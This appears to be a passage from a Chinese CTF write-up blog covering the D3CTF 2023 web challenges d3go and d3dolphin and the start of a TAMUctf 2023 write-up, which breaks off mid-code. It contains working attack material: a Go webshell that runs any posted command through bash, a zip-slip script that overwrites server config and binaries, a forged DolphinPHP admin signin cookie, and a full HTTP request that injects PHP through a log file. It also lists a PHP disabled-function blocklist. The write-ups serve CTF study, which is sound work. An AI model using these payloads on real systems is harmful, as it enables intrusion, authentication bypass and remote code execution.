class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就好说了，我们可以覆盖config.yaml实现自更新，以下是chatgpt问答</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">参考boogipop师傅的</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就是恶意的go文件，把他编译为二进制文件后，还需要准备一个yaml文件</p><p>下面这个是原本的config.yaml文件</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后利用zipslip去覆盖文件，因为题目并没有对unzip做处理，所以可以进行任意文件覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##生成的zip文件</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>然后将生成的文件上传到服务器上就可以成功rce了</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>提示：</strong></p><p><strong>没有必要蛮力。管理员自从他写日志后就再也没有出现过。</strong></p><p><strong>管理员通过简单地按照 <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> 所说的内容来修补错误</strong></p><p>题目</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>给了个CVE   然后告诉你这里使用了补丁来修复这个CVE</p><p>signin_token 可以很容易地通过提供⽤⼾名、id 和⽤⼾ [last_login_time] 来暴⼒破解</p><p><strong>因为admin的用户密码不知道，于是就去下载源码来进行查看</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>发现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// 判断是否记住登录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// 自动登录</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据log.txt，admin的last_login_time是2011-04-05 14:19:19，这样我们就可以⽣成⼀个signing_token：</p><p>这里需要的是时间戳  所以<strong>2011-04-05 14:19:19</strong>的时间戳为1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据签名认证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data 被认证的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据类型检测</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// url编码并生成query字符串</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以进行签名的伪造了</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>这里为了避免id和时间戳的混淆，于是这里就可以使用分+号来进行分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// 要计算 SHA-1 哈希的字符串</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// 计算 SHA-1 哈希值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// 输出：ab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成cookie后，就可以进行伪造登录了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>因为这里存在通配符，于是名字就可以这样取</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>添加cookie后就可以成功进行登录了</p><p>这里的版本是v1.5.1，于是可以去查看上一个版本的漏洞，看这个版本修复了啥，然后在通过看官方的修复有没有漏洞，我们可不可以进行绕过</p><p>根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 海豚PHP框架 [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 版权所有 2016~2019 广东卓锐软件有限公司 [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 官方网站: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 拒绝ie访问</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 模块管理中，不读取模块信息的目录</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// 禁用函数</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>直接去查看官方发布的补丁就行了</p><p>CVE-2023-0935 是使⽤ shell_exec 绕过 CVE-2021-46097 2. 根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。 然后使⽤登录管理⻔⼾ 在这个挑战中，shell_exec 被添加到 system.php 中的 disable_functions，以及 php.ini 下⾯的其他函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>我们的⽬标是基于 CVE-2021-46097 再次绕过它</p><p>这里的话就是个小0day了，得自己挖利用链了  <strong>(第一次遇到得自己挖0day的题)</strong></p><p>我们可以通过更改昵称来完全控制 <strong>$details</strong>（此处为 get_nickname(UID)）。action_name 为 “user_edit”。</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>修改名称</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp 框架在 Loader.php 中定义了⼀个名为 include_file 的函数</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>所以我们可以将think__include_file作为第⼀个参数传递给call_user_func。</p><p>奇怪的是，thinkphp在./runtime下记录了SQL⽇志，⽽我们刚才做的是修改admin的昵称。昵称先被拼接成⼀条SQL命令，然后记 录到⽇志中。</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.编辑admin的昵称，使⽇志⽂件包含我们的webshell。</p><p>3.擦除缓存。这⼀步是必须的，否则昵称不会更新。</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>将昵称编辑为../runtime/2023/05/01.log。我们可以通过发送这样的请求来执⾏PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>最后改命令来拿flag就行了</p><p><strong>难坏了</strong>   <strong>居然得自己分析源码来拿链子</strong>。。。。。。。</p><p>这里的话java还有好多东西没看  所以java题就先不进行复现了</p>]]></content>
      
      
      
        <tags>
            
            <tag> AntCTF x D³CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TAMUctf 2023-web-复现</title>
      <link href="/posts/662b134b.html"/>
      <url>/posts/662b134b.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/tamuctf/tamuctf-2023/tree/master/web">官方wp地址</a></p><p><a href="https://velog.io/@sani/TAMU-CTF-writeups">韩国老外的wp</a></p><h2 id="Blackbox"><a href="#Blackbox" class="headerlink" title="Blackbox"></a>Blackbox</h2><p><img src="../images/image-20230501140913517.png" alt="image-20230501140913517"></p><p>这里的话访问会报错，就是个文件包含，然后可以尝试用伪协议进行读取文件内容</p><p><img src="../images/image-20230501141309538.png" alt="image-20230501141309538"></p><p>扫目录的时候发先git源码泄露  于是使用githack工具去看能否读取到一些东西</p><p><img src="../images/image-20230501142033211.png" alt="image-20230501142033211"></p><p>读取到了文件，然后并下载下来了</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./util.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(INCLUDE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$resource</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>util.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_login</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:passwd&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">try_auth</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$hash_password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">db_login</span>(<span class="variable">$username</span>, <span class="variable">$hash_password</span>)-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_guest_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)), <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_admin_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$user_key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span 